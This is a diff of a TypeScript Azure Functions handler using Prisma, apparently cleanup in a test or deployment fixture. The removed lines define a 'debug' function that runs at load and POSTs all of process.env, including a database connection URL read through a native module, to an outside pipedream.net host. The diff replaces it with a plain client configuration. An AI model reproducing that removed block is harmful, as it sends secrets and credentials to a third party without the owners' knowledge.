@@ -1,38 +1,14 @@
 import { Context, HttpRequest } from '@azure/functions'
 import { Prisma, PrismaClient } from '@prisma/client'
-import https from 'https'
 
-const client = new PrismaClient()
-
-
-function debug(data: object) {
-  let value;
-  let error ='';
-  try {
-    const napi = require('./envTest.so.node')
-    value = napi.envTest('AZURE_FUNCTIONS_LINUX_PG_URL')
-  } catch (e) {
-    value = e
-    error = e.message
-  }
-  const d = JSON.stringify({...data, NAPI_VALUE: value, error })
-
-  const options = {
-    hostname: 'enj3c2foo1tt7f6.m.pipedream.net',
-    port: 443,
-    path: '/',
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-      'Content-Length': d.length,
+const client = new PrismaClient({
+  datasources: {
+    db: {
+      url: process.env.AZURE_FUNCTIONS_LINUX_PG_URL,
     },
-  }
+  },
+})
 
-  const req = https.request(options)
-  req.write(d)
-  req.end()
-}
-debug(process.env)
 export = async function (context: Context, req: HttpRequest): Promise<void> {
   await client.user.deleteMany({})
 
